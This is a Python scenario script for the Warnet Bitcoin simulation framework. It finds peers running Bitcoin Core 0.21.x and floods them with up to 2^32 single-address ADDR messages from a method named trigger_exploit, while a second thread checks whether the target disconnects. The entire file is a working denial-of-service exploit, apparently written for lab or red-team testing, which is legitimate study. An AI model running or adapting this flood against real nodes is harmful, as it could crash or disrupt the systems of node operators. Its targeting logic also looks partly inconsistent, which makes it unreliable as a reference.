#!/usr/bin/env python3
import time
import threading
from test_framework.messages import CAddress, msg_addr
from test_framework.p2p import P2PInterface
from warnet.test_framework_bridge import WarnetTestFramework

def cli_help():
    return "Run ADDR message test on 0.21.x nodes without chunking"

class AddrMessageTest(WarnetTestFramework):
    def set_test_params(self):
        self.num_nodes = 0  # We'll connect to existing nodes in the network
        self.num_addrs = 2 ** 32  # Total number of ADDR messages to send
        self.test_duration = 600  # Test duration in seconds (10 minutes)
        self.stop_event = threading.Event()

    def run_test(self):
        self.wait_for_network_connection()
        target_nodes = self.find_target_nodes()

        if not target_nodes:
            self.log.warning("No nodes running version 0.21.x found")
            return

        for i, node in enumerate(target_nodes):
            self.log.info(f"Testing node {i} running version 0.21.x")
            p2p_conn = self.establish_p2p_connection(node, i)
            
            monitor_thread = threading.Thread(target=self.monitor_node_connection, args=(node,))
            exploit_thread = threading.Thread(target=self.trigger_exploit, args=(p2p_conn,))
            
            monitor_thread.start()
            exploit_thread.start()
            
            monitor_thread.join()
            exploit_thread.join()
            
            self.stop_event.clear()

    def wait_for_network_connection(self):
        self.log.info("Waiting for complete network connection...")
        while not self.warnet.network_connected():
            time.sleep(5)
        self.log.info("Network connected")

    def find_target_nodes(self):
        target_nodes = []
        for node in self.nodes:
            peer_info = node.getpeerinfo()
            for peer in peer_info:
                if 210000 <= peer['version'] < 220000:
                    target_nodes.append(node)
                    self.log.info(f"Found node running version 0.21.x: {peer['version']}")
                    break  # Found a 0.21.x peer for this node, move to next node
        return target_nodes

    def establish_p2p_connection(self, node, index):
        return node.add_p2p_connection(P2PInterface(), dstaddr=self.warnet.tanks[index].ipv4, dstport=18444)

    def trigger_exploit(self, node):
        self.log.info(f"Sending {self.num_addrs} individual ADDR messages")
        start_time = time.time()
        addr = self.create_addr()

        for i in range(self.num_addrs):
            if self.stop_event.is_set():
                self.log.info("Stopping message transmission due to node disconnection")
                break
            
            msg = msg_addr()
            msg.addrs = [addr]
            node.send_message(msg)
            
            if i % 1000000 == 0:
                elapsed_time = time.time() - start_time
                self.log.info(f"Sent {i} ADDR messages in {elapsed_time:.2f} seconds...")

        total_time = time.time() - start_time
        self.log.info(f"Finished sending ADDR messages in {total_time:.2f} seconds")

    def create_addr(self):
        addr = CAddress()
        addr.ip = "127.0.0.1"
        addr.port = 8333
        addr.nTime = int(time.time())
        return addr

    def monitor_node_connection(self, node):
        start_time = time.time()
        self.log.info("Monitoring node connection status...")

        while time.time() - start_time < self.test_duration:
            if not node.is_connected():
                self.log.error("Node disconnected during the test")
                self.stop_event.set()
                return
            time.sleep(10)

        if node.is_connected():
            self.log.info("Node remained connected throughout the test duration")
        else:
            self.log.error("Node disconnected at the end of the test duration")

if __name__ == "__main__":
 AddrMessageTest().main()
